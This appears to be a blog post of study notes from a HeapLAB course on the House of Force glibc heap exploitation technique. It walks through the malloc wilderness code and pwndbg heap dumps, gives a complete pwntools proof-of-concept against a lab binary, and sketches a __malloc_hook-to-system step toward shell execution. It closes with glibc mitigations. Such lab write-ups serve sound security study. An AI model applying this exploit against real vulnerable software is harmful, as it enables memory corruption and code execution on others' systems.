---
layout: post
title:  "HeapLAB 1 - House of Force"
date:   2022-12-03 19:59:43 +0300
categories: jekyll update
---

**Contents**
* TOC
{:toc}
## History

Was first documented in 2005, in [The Malloc Maleficarum][the-malloc-maleficarum].

This paper describes 5 generic heap exploitation techniques:
House of Prime, Mind, Force, Lore and Spirit. 

## House of Force - Paper

### General

This technique holds for glibc versions `< 2.29`.
The purpose of the House of Force is to exploit the wilderness (top chunk).\
This chunk also have an header, containing its size, followed by long data section.

The wilderness borders the end of available memory - and is the only chunk that can be extended or shortened. 

It must *always* exist. Realistically it should never be passed to `free()`, and never contain app data. 

So the idea is to overflow the top chunk, in such way that the wilderness pointer stores an arbitrary value - which can result with arbitrary data chunk returned to a requesting application.

Requires: 2 `malloc` calls.
The first call must contain attacker-controlled size, and the second call must be large enough to trigger the wilderness code. 


### Wilderness Code

```c
Void_t*
_int_malloc(mstate av, size_t bytes)
{
    INTERNAL_SIZE_T nb;               /* normalized request size */
    mchunkptr       victim;           /* inspected/selected chunk */
    INTERNAL_SIZE_T size;             /* its size */
    mchunkptr       remainder;        /* remainder from a split */
    unsigned long   remainder_size;   /* its size */
    ...
    checked_request2size(bytes, nb);
    ...
    use_top:
      victim = av->top;
      size = chunksize(victim);

      if ((unsigned long)(size) >= (unsigned long)(nb + MINSIZE)) {
        remainder_size = size - nb;
        remainder = chunk_at_offset(victim, nb);
        av->top = remainder;
        set_head(victim, nb | PREV_INUSE |
                 (av != &main_arena ? NON_MAIN_ARENA : 0));
        set_head(remainder, remainder_size | PREV_INUSE);
        check_malloced_chunk(av, victim, nb);
        return chunk2mem(victim);
    }
```

`av` stands for the current arena context pointer. \
`bytes` stands for the attacker-controlled requested chunk size, while `nb` is the normalized size (including header size, alignment, etc). 

`victim` is a pointer towards the top chunk, and `size` stands for its size. 

A basic sanity check is being perform, checking there is enough memory to be teared-off the top chunk towards the requested memory, while leaving at least `MINSIZE` bytes available on the top chunk.

The first goal of the House of Force, is to overwrite `av->top`, the top chunk pointer, with an arbitrary large value - preferably `0xffffffff`.

This can be done, for example, if we control the allocated chunk size, producing an under-allocation, and overflowing it with user-controlled data.

By setting the top chunk size to maximum, even large `malloc` allocations will trigger the wilderness code, instead of trying to extend the heap. 

The goal of the attacker is to control the request size, to position the `remainder`, aka the updated top chunk, to 8 bytes (due header) before a *.GOT, .dtors, .data, etc* entry. \
The only restriction on the new wilderness is that its size must be larger than the large triggering-malloc request. 

Usually, the most challenging issue about Hose of Force is having complete control on the `size` parameter being passed to `malloc`. 

For example, scenario such as:

```c
buf = (char *) malloc(strlen(str) + 1);
```

May be un-realistic to exploit - as it requires inserting a string of length `align_of(0xffffffff - 1 - 8)`. 

A more-realistic scenario is a controlled integer, determining the `malloc` allocation size.

## Exploitation

Assume we can perform an under-allocation for chunk, and overflowing it with attacker-controlled data.

The following heap layout would occur:

```bash
pwndbg> vis

0x603000        0x0000000000000000      0x0000000000000021      ........!.......
0x603010        0x0000000a59595959      0x0000000000000000      YYYY............
0x603020        0x0000000000000000      0x0000000000000021      ........!.......
0x603030        0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x603040        0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA    <-- Top chunk
```

Meaning the top chunk `size` field was overflowed.
Note that even a single byte overflow can corrupt the size field of the succeeding chunk - including the top chunk. 

Because many versions of glibc have no top chunk integrity checks (such as glibc-2.28), malloc would take this new, corrupted value as correct. 

If the top chunk's `size` field overwritten by a large value, than from `malloc`'s view, that top chunk extend across the heap segment - for example towards *dynamically loaded libraries*, or even the *stack* (that are located at much higher addresses). 

But what if we want to overwrite an address located at lower addresses, prior to the heap segment? \
For example, the program's data segment?

The trick here is to provide an extremely large value, so that the top chunk `size` actually wraps around the maximal value of the virtual address space - back to the start. (Note - large allocations wrap-arounds are possible for glibc verion `< 2.30`).


So after overwriting the top chunk's `size` attribute to an extremely large value, we would request a large chunk, that would wrap-around the VA address space. \
Then we would issue one small request, that would return a chunk pointing towards our desired target at the data segment. 

I've executed a python POC via pwntools `GDB` and `NOASLR` CLI options. \
By overriding the first 8 bytes of the top chunk, i got the follwing heap layout:

```bash
pwndbg> vis

0x603000        0x0000000000000000      0x0000000000000021      ........!.......
0x603010        0x5959595959595959      0x5959595959595959      YYYYYYYYYYYYYYYY
0x603020        0x5959595959595959      0xffffffffffffffff      YYYYYYYY........    <-- Top chunk
```

Note the top chunk `size` metadata starts at `0x603028`, the chunk content at `0x603030`, and the whole chunk metadata at `0x603020` - 16 bytes prior to the content. 

Therefore, for our big allocation, we would like to perform a wrap around, from the *top chunk real start* (aka `0x603020`), towards 0x20 bytes prior to our goal address (lets say, `0x602010`). 

Meaning - allocation of `0xffffffff - 0x603020 + 0x602010 - 0x20`

The trick is to leave `0x20` bytes for next allocation. That way it will point exactly towards the target address.
Since the lowest possible allocation for malloc is 24 bytes of data, and 8 bytes for the `size`, it yields a minimal chunk size of 32 bytes. 

We *can* allocate these extra 0x20 bytes with a single `malloc`. \ 
However, it will require the exploit to fill about 0xffffffff bytes, and because some of the memory regions aren't mapped (or mapped to RODATA) - it will lead to a segfault.

POC code:

```python
#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("house_of_force")
libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Select the "malloc" option, send size & data.
def malloc(size, data):
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")

# Calculate the "wraparound" distance between two addresses.
def delta(x, y):
    return (0xffffffffffffffff - x) + y

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts

# This binary leaks the heap start address.
io.recvuntil(b"heap @ ")
heap = int(io.recvline(), 16)
io.recvuntil(b"> ")
io.timeout = 0.1

# =============================================================================

# =-=-=- EXAMPLE -=-=-=

# The "heap" variable holds the heap start address.
info(f"heap: 0x{heap:02x}")

# Program symbols are available via "elf.sym.<symbol name>".
info(f"target: 0x{elf.sym.target:02x}")

# The malloc() function chooses option 1 from the menu.
# Its arguments are "size" and "data".
malloc(24, b"Y"*24 + b"\xff"*8)

# Note - heap + 0x20 points towards the top chunk (8 bytes before its size metadata, 16 byts before its content)
distance = delta(heap + 0x20, elf.sym.target - 0x20)

# request the large chunk
malloc(distance, b"A")

# override the target address
malloc(24, b"B"*24)

# The delta() function finds the "wraparound" distance between two addresses.
info(f"delta between heap & main(): 0x{delta(heap, elf.sym.main):02x}")

# =============================================================================

io.interactive()
```

## Further Notes

If the target address lays on the same heap as the corrupted top chunk, no need for heap address leak - as the allocation can wrap around the VA space back into the same heap. 

Viable heap function pointer target would be the `__malloc_hook`.
By overwriting this pointer with the address of `system`, then passing `/bin/sh` pointer as an allocation size, code execution would be achieved. 

## Mitigations

GLIBC 2.29 adds top chunk `size` sanity check - so that it cannot exceed its arena's `system_mem`. 

GLIBC 2.30 adds a maximum allocation size check for malloc - limiting possible wrap-arounds. 


[the-malloc-maleficarum]: https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt
